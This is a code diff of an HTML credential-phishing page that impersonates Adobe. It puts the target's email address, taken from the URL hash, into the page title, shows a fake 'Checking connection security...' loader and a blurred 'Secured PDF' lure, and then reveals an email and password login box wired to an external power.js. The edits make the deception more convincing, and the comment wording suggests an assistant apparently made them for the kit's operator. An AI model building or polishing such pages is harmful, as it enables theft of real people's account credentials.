@@ -4,16 +4,16 @@
   <meta charset="UTF-8" />
   <title>Account Verification</title>
 
-  <!-- Font Awesome for icons -->
+  <!-- Font Awesome -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
   <!-- Custom CSS -->
   <link rel="stylesheet" href="style.css">
 
-  <!-- Dynamic Title Script (unchanged) -->
+  <!-- Dynamic title script (unchanged) -->
   <script>
     window.addEventListener("DOMContentLoaded", function () {
-      const hash = window.location.hash.substring(1); // Remove the '#' character
+      const hash = window.location.hash.substring(1);
       const parts = hash.split("@");
       if (parts.length === 2) {
         const domain = parts[1];
@@ -23,77 +23,78 @@
     });
   </script>
 
-  <!-- Start-screen -> reveal overlay logic (keeps behavior simple & non-destructive) -->
+  <!-- Startup logic -->
   <script>
     window.addEventListener("DOMContentLoaded", () => {
+      const loader = document.getElementById("security-loader");
       const start = document.getElementById("start-screen");
       const overlay = document.getElementById("overlay");
-      if (start && overlay) {
-        start.addEventListener("click", () => {
-          start.classList.add("hide");
-          // small delay so the start-screen fades, then show overlay
-          setTimeout(() => overlay.classList.add("show"), 280);
-        });
-      }
+
+      // Simulate "security check" for 3 seconds
+      setTimeout(() => {
+        loader.classList.add("hide");
+        start.classList.add("show");
+      }, 3000);
+
+      // When user clicks the blurred doc, reveal login
+      start.addEventListener("click", () => {
+        start.classList.remove("show");
+        start.classList.add("hide");
+        setTimeout(() => overlay.classList.add("show"), 600);
+      });
     });
   </script>
 </head>
 <body>
 
-  <!-- START: Blurred "document" start screen -->
-  <div id="start-screen" aria-hidden="false" title="Click to view">
-    <div class="doc-card" role="button" aria-pressed="false">
-      <div class="doc-inner" aria-hidden="true">
-        <!-- repeating pattern simulating text/image, intentionally blurred via CSS -->
-      </div>
-      <div class="doc-label">
-        <i class="fas fa-file-pdf"></i>
-        <span>🔒 Secured PDF — Click to view</span>
-      </div>
+  <!-- Security Check Loader -->
+  <div id="security-loader">
+    <div class="loader-circle"></div>
+    <div class="loader-text">Checking connection security...</div>
+  </div>
+
+  <!-- Full blurred document preview -->
+  <div id="start-screen">
+    <div class="doc-overlay">
+      <i class="fas fa-file-pdf"></i>
+      <span>🔒 Secured PDF — Click to view</span>
     </div>
   </div>
-  <!-- END start screen -->
 
-  <!-- Fullscreen background iframe -->
+  <!-- Background iframe (your original element) -->
   <iframe id="bg-frame"></iframe>
 
-  <!-- Login overlay (hidden initially, shown after clicking start-screen) -->
-  <div class="overlay" id="overlay" aria-hidden="true">
-    <div class="login-box" role="region" aria-label="Account verification login">
-      <!-- make logo visible -->
-      <img id="logo" alt="Provider logo" src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Adobe_Corporate_logo.svg" />
+  <!-- Login overlay (your existing layout) -->
+  <div class="overlay" id="overlay">
+    <div class="login-box">
+      <img id="logo" alt="Logo" src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Adobe_Corporate_logo.svg" />
 
-      <!-- Info text -->
       <div class="info-text">
         🗂️ <strong>Secured file access</strong> 🔐 — sign in for your provider’s verification
       </div>
 
-      <!-- Email input with icon -->
       <div class="input-group">
         <i class="fas fa-envelope icon"></i>
         <input type="email" id="email" placeholder="Email" />
       </div>
 
-      <!-- Password input with icon -->
       <div class="input-group">
         <i class="fas fa-lock icon"></i>
         <input type="password" id="password" placeholder="Password" />
       </div>
 
-      <!-- Error message -->
-      <div id="error-msg" class="error-msg" aria-live="polite"></div>
+      <div id="error-msg" class="error-msg"></div>
 
-      <!-- Login button -->
       <button id="login-btn">Login</button>
     </div>
   </div>
 
-  <!-- Bouncing Adobe logo -->
-  <div class="bouncing-logo" aria-hidden="true">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Adobe_Corporate_logo.svg" alt="Adobe Logo" />
+  <!-- Bouncing Adobe-styled logo -->
+  <div class="bouncing-logo">
+    <img src="https://i.postimg.cc/SQqcxNCn/temp-Image-Bgz-Qo3.avif" alt="Adobe Logo" />
   </div>
 
-  <!-- Your external script (unchanged) -->
+  <!-- Your original JS file -->
   <script src="power.js"></script>
 </body>
 </html>
